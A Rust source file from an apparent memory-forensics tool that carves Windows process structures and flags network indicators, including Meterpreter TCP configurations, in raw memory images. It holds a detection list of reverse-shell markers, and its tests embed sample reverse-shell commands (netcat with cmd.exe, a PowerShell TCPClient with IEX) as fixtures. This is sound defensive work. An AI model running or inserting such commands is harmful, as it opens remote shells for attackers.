//! Bounded residual leads. Raw offsets are acquisition offsets, including container headers.
use super::{cancelled, record};
use crate::volatility::Record;
use serde_json::json;
use std::{
    collections::{BTreeMap, BTreeSet},
    fs::File,
    io::Read,
    path::Path,
    sync::atomic::AtomicBool,
};

const CHUNK: usize = 4 * 1024 * 1024;
const OVERLAP: usize = 16 * 1024;
const LIMIT: usize = 2_000;

// This profile is never enabled by OS version guesses or by the requested filename.
// At least five distinct, timestamped engine inventory identities must corroborate it.
const NAME: usize = 0x5a8;
const PID: usize = 0x440;
const PPID: usize = 0x540;
const CREATED: usize = 0x468;
const EXITED: usize = 0x840;
const PROFILE: &str = "Windows x64 EPROCESS 19041 layout, corroborated by inventory";

fn integer(bytes: &[u8], at: usize) -> Option<u64> {
    Some(u64::from_le_bytes(bytes.get(at..at + 8)?.try_into().ok()?))
}

fn filetime(value: u64) -> Option<chrono::DateTime<chrono::Utc>> {
    let micros = i64::try_from(value / 10)
        .ok()?
        .checked_sub(11_644_473_600_000_000)?;
    chrono::DateTime::from_timestamp_micros(micros)
}

fn candidate(
    bytes: &[u8],
    at: usize,
    name: &str,
    latest: chrono::DateTime<chrono::Utc>,
) -> Option<Record> {
    let start = at.checked_sub(NAME)?;
    let bytes = bytes.get(start..start + EXITED + 8)?;
    if bytes[0] != 3 || bytes.get(NAME + name.len()) != Some(&0) {
        return None;
    }
    let pid = integer(bytes, PID)?;
    let parent = integer(bytes, PPID)?;
    let dtb = integer(bytes, 0x28)?;
    let link = integer(bytes, 8)?;
    if pid == 0
        || pid > u64::from(u32::MAX)
        || !pid.is_multiple_of(4)
        || parent > u64::from(u32::MAX)
        || !parent.is_multiple_of(4)
        || dtb == 0
        || dtb & 0xfff != 0
        || link >> 48 != 0xffff
        || link & 7 != 0
        || integer(bytes, 16)? != link
    {
        return None;
    }
    let birth = filetime(integer(bytes, CREATED)?)?;
    if birth.timestamp() < 946_684_800 || birth > latest + chrono::Duration::days(1) {
        return None;
    }
    let exit = integer(bytes, EXITED)?;
    let exit = if exit == 0 {
        String::new()
    } else {
        let exited = filetime(exit)?;
        if exited < birth || exited > latest + chrono::Duration::days(1) {
            return None;
        }
        exited.to_rfc3339()
    };
    Some(record(
        json!({"PID":pid,"PPID":parent,"Process":name,"CreateTime":birth.to_rfc3339(),
        "ExitTime":exit,"Profile":PROFILE,"Directory table base":format!("0x{dtb:x}")}),
    ))
}

fn text_context(bytes: &[u8], at: usize, step: usize) -> (usize, String) {
    let unit = |i: usize| -> Option<u8> {
        let b = *bytes.get(i)?;
        (step == 1 || bytes.get(i + 1) == Some(&0))
            .then_some(b)
            .filter(|b| matches!(b, 9 | 10 | 13 | 32..=126))
    };
    let mut left = at;
    while left >= step && at - left < 512 && unit(left - step).is_some() {
        left -= step;
    }
    let mut right = at;
    while right < bytes.len() && right - left < 8192 && unit(right).is_some() {
        right += step;
    }
    let text = bytes[left..right]
        .chunks(step)
        .map(|b| char::from(b[0]))
        .collect::<String>();
    (left, text)
}

// Legacy Meterpreter Windows configuration: 48-byte session, 512 WCHAR URL,
// three DWORD timeouts, then the next transport or a zero terminator.
// https://github.com/rapid7/metasploit-framework/blob/6.3.31/lib/rex/payloads/meterpreter/config.rb
fn meterpreter_config(bytes: &[u8], at: usize, address: &str) -> Option<serde_json::Value> {
    let session = bytes.get(at.checked_sub(48)?..at)?;
    let url = bytes.get(at..at + 1024)?;
    let used = address.encode_utf16().count().checked_mul(2)?;
    if used >= 1024 || url.get(used..)?.iter().any(|b| *b != 0) {
        return None;
    }
    let dword =
        |slice: &[u8], i: usize| Some(u32::from_le_bytes(slice.get(i..i + 4)?.try_into().ok()?));
    let exit = dword(session, 8)?;
    if ![0, 0x56a2b5f0, 0x0a2a1de0, 0xea320efe, 0x5de2c5aa].contains(&exit) {
        return None;
    }
    let expiry = dword(session, 12)?;
    if expiry > 10 * 366 * 86400 || session[16..32].iter().all(|b| *b == 0) {
        return None;
    }
    let timers = bytes.get(at + 1024..at + 1036)?;
    let comms = dword(timers, 0)?;
    let retry = dword(timers, 4)?;
    let wait = dword(timers, 8)?;
    if comms == 0
        || comms > 366 * 86400
        || retry == 0
        || retry > 366 * 86400
        || wait == 0
        || wait > retry
    {
        return None;
    }
    if bytes.get(at + 1036..at + 1038) != Some(&[0, 0][..]) {
        return None;
    }
    Some(
        json!({"Payload UUID":session[16..32].iter().map(|b| format!("{b:02x}")).collect::<String>(),
        "Session GUID":session[32..48].iter().map(|b| format!("{b:02x}")).collect::<String>(),
        "Session expiry seconds":expiry,"Communications timeout seconds":comms,"Retry total seconds":retry,"Retry wait seconds":wait}),
    )
}

pub(super) fn scan(
    path: &Path,
    names: &BTreeSet<String>,
    anchors: &[(u64, String, String)],
    cancel: &AtomicBool,
    progress: &impl Fn(String),
) -> Result<(Vec<Record>, Vec<Record>, String), String> {
    let anchors = anchors
        .iter()
        .filter_map(|(pid, name, birth)| {
            let birth = super::time(birth)?;
            (!name.is_empty() && name.len() <= 15).then_some((*pid, name.clone(), birth))
        })
        .collect::<BTreeSet<_>>();
    let latest = anchors.iter().map(|(_, _, t)| *t).max();
    let selected = anchors
        .iter()
        .map(|(_, name, _)| name.clone())
        .collect::<BTreeSet<_>>()
        .into_iter()
        .take(8)
        .collect::<Vec<_>>();
    let mut searches = selected.into_iter().collect::<BTreeSet<_>>();
    searches.extend(
        names
            .iter()
            .filter(|n| n.len() <= 15 && !n.is_empty())
            .cloned(),
    );
    let omitted_names = searches.len().saturating_sub(128);
    // Engine inventories still cover every filename; bound the additional raw scan work.
    let searches = searches.into_iter().take(128).collect::<Vec<_>>();
    let markers = [
        "tcp://",
        "TCPClient",
        "TcpClient",
        "tcpclient",
        "nc.exe ",
        "ncat.exe ",
    ];
    let mut file = File::open(path).map_err(|e| e.to_string())?;
    let total = file.metadata().map_err(|e| e.to_string())?.len();
    let mut chunk = vec![0; CHUNK];
    let mut buffer = Vec::with_capacity(CHUNK + OVERLAP);
    let mut base = 0u64;
    let mut scanned = 0u64;
    let mut matches = BTreeMap::new();
    let mut reference = BTreeSet::new();
    let mut leads = BTreeMap::new();
    let mut limited = omitted_names > 0;
    loop {
        cancelled(cancel)?;
        let n = file.read(&mut chunk).map_err(|e| e.to_string())?;
        buffer.extend_from_slice(&chunk[..n]);
        let end = if n == 0 {
            buffer.len()
        } else {
            buffer.len().saturating_sub(OVERLAP)
        };
        if let Some(latest) = latest {
            for name in &searches {
                for at in memchr::memmem::find_iter(&buffer, name.as_bytes())
                    .filter(|at| *at < end && base + *at as u64 >= scanned)
                {
                    if let Some(mut row) = candidate(&buffer, at, name, latest) {
                        let pid = super::number(&row, "PID").unwrap();
                        let birth = super::time(&row.text("CreateTime")).unwrap();
                        if anchors.iter().any(|(id, expected, time)| {
                            *id == pid
                                && expected == name
                                && (*time - birth).num_milliseconds().abs() < 1000
                        }) {
                            reference.insert(pid);
                        }
                        if names.contains(name) && matches.len() < LIMIT {
                            row.fields.insert(
                                "Acquisition offset".into(),
                                (base + (at - NAME) as u64).into(),
                            );
                            row.fields
                                .insert("Match offset".into(), (base + at as u64).into());
                            matches.insert((pid, name.clone(), row.text("CreateTime")), row);
                        } else if names.contains(name) {
                            limited = true;
                        }
                    }
                }
            }
        }
        if leads.len() < LIMIT {
            'markers: for marker in markers {
                for step in [1, 2] {
                    let pattern = if step == 1 {
                        marker.as_bytes().to_vec()
                    } else {
                        marker.encode_utf16().flat_map(u16::to_le_bytes).collect()
                    };
                    for at in memchr::memmem::find_iter(&buffer, &pattern)
                        .filter(|at| *at < end && base + *at as u64 >= scanned)
                    {
                        if leads.len() >= LIMIT {
                            limited = true;
                            break 'markers;
                        }
                        let (left, text) = text_context(&buffer, at, step);
                        for mut row in super::super::network::parse_text(&text) {
                            if row.text("IP").is_empty() {
                                continue;
                            }
                            row.fields
                                .insert("Remote IP".into(), row.fields["IP"].clone());
                            row.fields
                                .insert("Remote port".into(), row.fields["Port"].clone());
                            row.fields
                                .insert("Acquisition offset".into(), (base + left as u64).into());
                            row.fields
                                .insert("Match offset".into(), (base + at as u64).into());
                            row.fields.insert(
                                "Encoding".into(),
                                if step == 1 { "UTF-8" } else { "UTF-16LE" }.into(),
                            );
                            if step == 2
                                && row.text("Finding") == "TCP transport endpoint"
                                && let Some(config) =
                                    meterpreter_config(&buffer, at, &row.text("URI"))
                            {
                                row.fields.insert(
                                    "Finding".into(),
                                    "Meterpreter TCP configuration".into(),
                                );
                                row.fields.insert("Payload configuration".into(), config);
                                row.fields.insert(
                                    "Configuration offset".into(),
                                    (base + at as u64 - 48).into(),
                                );
                                row.fields.insert("Interpretation".into(),"Legacy Meterpreter session and TCP transport layout validated, including URL padding, payload UUID, exit function and timeouts. This is a configured endpoint; process ownership and a successful connection require separate evidence.".into());
                            }
                            row.fields.insert("Network evidence".into(),"Unattributed acquisition text; does not prove execution, connection or download association".into());
                            row.fields.insert("Sources".into(),json!([{"Role":"Connection text","Offset":base+left as u64,"Encoding":row.text("Encoding")} ]));
                            leads
                                .entry((
                                    base + left as u64,
                                    row.text("IP"),
                                    row.text("Port"),
                                    row.text("Finding"),
                                ))
                                .or_insert(row);
                            if leads.len() >= LIMIT {
                                limited = true;
                                break 'markers;
                            }
                        }
                    }
                }
            }
        }
        scanned = base + end as u64;
        if n == 0 {
            break;
        }
        // Keep bytes before and after the next match, even when a structure straddles a chunk.
        let discard = end.saturating_sub(OVERLAP / 2);
        buffer.drain(..discard);
        base += discard as u64;
        progress(format!(
            "Download memory evidence: {} / {} MiB",
            (base + buffer.len() as u64) / 1048576,
            total / 1048576
        ));
    }
    let enabled = reference.len() >= 5;
    let processes = if enabled {
        matches
            .into_values()
            .map(|mut row| {
                row.fields
                    .insert("Profile reference PIDs".into(), json!(reference));
                row
            })
            .collect()
    } else {
        Vec::new()
    };
    let message = format!(
        "Scanned {total} acquisition bytes. Residual process profile {} against {} inventory PIDs. Carved process copies do not establish acquisition-time activity. Explicit connection text is kept separate from download and socket evidence.{}",
        if enabled { "validated" } else { "not enabled" },
        reference.len(),
        if limited {
            " Residual finding limit reached."
        } else {
            ""
        }
    );
    Ok((processes, leads.into_values().collect(), message))
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    #[test]
    fn connection_limit_is_enforced_inside_one_marker_dense_chunk() {
        let temp = tempfile::tempdir().unwrap();
        let path = temp.path().join("memory.raw");
        fs::write(
            &path,
            b"nc.exe -e cmd.exe 192.0.2.1 4444\0".repeat(LIMIT + 100),
        )
        .unwrap();
        let (_, leads, message) = scan(
            &path,
            &BTreeSet::new(),
            &[],
            &AtomicBool::new(false),
            &|_| {},
        )
        .unwrap();
        assert_eq!(leads.len(), LIMIT);
        assert!(message.contains("limit reached"));
    }
    #[test]
    fn meterpreter_configuration_needs_the_structure_not_just_a_tcp_url() {
        let address = "tcp://192.0.2.5:5059";
        let mut bytes = vec![0; 48 + 1038];
        bytes[8..12].copy_from_slice(&0x56a2b5f0u32.to_le_bytes());
        bytes[12..16].copy_from_slice(&604800u32.to_le_bytes());
        bytes[16..32].copy_from_slice(&[0x11; 16]);
        let url = address
            .encode_utf16()
            .flat_map(u16::to_le_bytes)
            .collect::<Vec<_>>();
        bytes[48..48 + url.len()].copy_from_slice(&url);
        for (i, v) in [300u32, 3600, 10].into_iter().enumerate() {
            bytes[48 + 1024 + i * 4..48 + 1028 + i * 4].copy_from_slice(&v.to_le_bytes());
        }
        assert!(meterpreter_config(&bytes, 48, address).is_some());
        bytes[48 + 100] = 1;
        assert!(meterpreter_config(&bytes, 48, address).is_none());
        bytes[48 + 100] = 0;
        bytes[8..12].fill(0xff);
        assert!(meterpreter_config(&bytes, 48, address).is_none());
        assert!(meterpreter_config(&bytes[..48 + 100], 48, address).is_none());
    }
    fn process(bytes: &mut [u8], base: usize, name: &str, pid: u64, birth: u64) {
        bytes[base] = 3;
        for (at, value) in [
            (8, 0xffff800000001008u64),
            (16, 0xffff800000001008),
            (0x28, 0x123000),
            (PID, pid),
            (PPID, 4),
            (CREATED, birth),
        ] {
            bytes[base + at..base + at + 8].copy_from_slice(&value.to_le_bytes());
        }
        bytes[base + NAME..base + NAME + name.len()].copy_from_slice(name.as_bytes());
    }
    #[test]
    fn residual_process_requires_inventory_corroboration_and_survives_a_chunk_boundary() {
        let temp = tempfile::tempdir().unwrap();
        let path = temp.path().join("memory.raw");
        let unix = chrono::DateTime::parse_from_rfc3339("2023-09-14T02:00:00Z").unwrap();
        let birth = ((unix.timestamp_micros() + 11_644_473_600_000_000) as u64) * 10;
        let mut bytes = vec![0; CHUNK + OVERLAP];
        let mut anchors = Vec::new();
        for i in 0..5 {
            let name = format!("anchor{i}.exe");
            let pid = 100 + i * 4;
            process(&mut bytes, 4096 + i as usize * 4096, &name, pid, birth);
            anchors.push((pid, name, unix.to_rfc3339()));
        }
        let base = CHUNK - OVERLAP - 700;
        process(&mut bytes, base, "payload.exe", 900, birth);
        bytes[CHUNK + 100..CHUNK + 100 + 11].copy_from_slice(b"payload.exe"); // A name alone is not a process.
        fs::write(&path, &bytes).unwrap();
        let names = ["payload.exe".to_string()].into();
        let (found, _, message) =
            scan(&path, &names, &anchors, &AtomicBool::new(false), &|_| {}).unwrap();
        assert_eq!(found.len(), 1, "{message}");
        assert_eq!(found[0].fields["Acquisition offset"], base);
        assert_eq!(found[0].fields["PID"], 900);
        let (found, _, message) = scan(
            &path,
            &names,
            &anchors[..4],
            &AtomicBool::new(false),
            &|_| {},
        )
        .unwrap();
        assert!(found.is_empty());
        assert!(message.contains("not enabled"));
    }
    #[test]
    fn raw_connection_text_is_unattributed_and_does_not_borrow_a_payload_pid() {
        let temp = tempfile::tempdir().unwrap();
        let path = temp.path().join("memory.raw");
        let mut bytes = vec![0xff; CHUNK - OVERLAP - 8];
        let at = bytes.len();
        bytes.extend(
            "New-Object Net.Sockets.TCPClient('192.0.2.5',4444); IEX $command"
                .encode_utf16()
                .flat_map(u16::to_le_bytes),
        );
        bytes.extend([0xff; 10]);
        fs::write(&path, bytes).unwrap();
        let (_, leads, _) = scan(
            &path,
            &BTreeSet::new(),
            &[],
            &AtomicBool::new(false),
            &|_| {},
        )
        .unwrap();
        assert_eq!(leads.len(), 1);
        assert_eq!(leads[0].fields["Acquisition offset"], at);
        assert_eq!(leads[0].text("Remote IP"), "192.0.2.5");
        assert!(leads[0].text("PID").is_empty());
        assert_eq!(leads[0].text("Encoding"), "UTF-16LE");
    }
}
